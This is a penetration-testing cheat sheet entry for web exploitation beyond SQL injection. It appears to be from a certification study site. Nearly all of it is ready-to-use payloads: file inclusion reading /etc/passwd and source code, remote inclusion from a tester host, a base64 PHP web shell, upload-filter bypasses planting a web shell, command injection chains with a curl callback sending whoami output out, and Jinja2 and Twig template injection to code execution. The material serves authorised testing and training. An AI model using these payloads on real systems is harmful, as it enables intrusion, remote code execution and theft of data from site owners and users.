---
tool: Web attacks
slug: web-attacks
kind: technique
stages: [exploitation]
category: LFI, upload, command injection, SSTI
platforms: [web, linux]
services: [http, https]
ports: [80, 443, 8080, 8443]
tags: [web, lfi, rfi, file-upload, command-injection, ssti, xss]
attack: [T1190, T1059]
summary: The web flaws that turn a page into code execution or file read, beyond SQL injection. Local and remote file inclusion, upload bypasses, command injection and template injection, with the payloads to confirm each.
references:
  - PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings
  - OWASP Testing Guide | https://owasp.org/www-project-web-security-testing-guide/
---

## Local / remote file inclusion (LFI/RFI)

```text
# A parameter that loads a file. Read files, then escalate to code.
?page=../../../../etc/passwd
?page=....//....//etc/passwd            # filter bypass
?page=php://filter/convert.base64-encode/resource=index.php   # read source
?page=/var/log/apache2/access.log      # log poisoning -> RCE
?page=http://10.10.14.5/shell.txt      # RFI when allow_url_include=On
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
```

## File upload bypass

```text
# Get a web shell past a filter, then browse to it.
shell.php         ->  shell.phtml / .php5 / .phar / .pht      # extension allowlist
Content-Type: image/png                                       # spoof MIME
GIF89a; <?php system($_GET['c']); ?>                          # magic bytes + code
shell.php%00.png / shell.php.png / shell.pHp                  # null byte / double ext / case
.htaccess -> AddType application/x-httpd-php .xyz             # make .xyz run as PHP
```

## Command injection

```bash
# A field passed to a shell. Chain your command on.
; id          | id          `id`          $(id)
%0a id        && id         || id
# Blind: force a delay or call back to you
; ping -c 3 10.10.14.5      ; curl 10.10.14.5/`whoami`
```

## Server-side template injection (SSTI)

```text
# Detect: does {{7*7}} render as 49?
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>
# Jinja2 (Python) to RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}
# Twig (PHP)
{{ ['id']|filter('system') }}
```

## Notes

Confirm the class of bug with a safe probe (`{{7*7}}`, a sleep, reading `/etc/passwd`) before weaponising. For SQL injection, reach for [sqlmap](/cpts/#tool-sqlmap). Map what the parameter touches (file, shell, template, query) and pick the matching payload. Only test applications in scope.
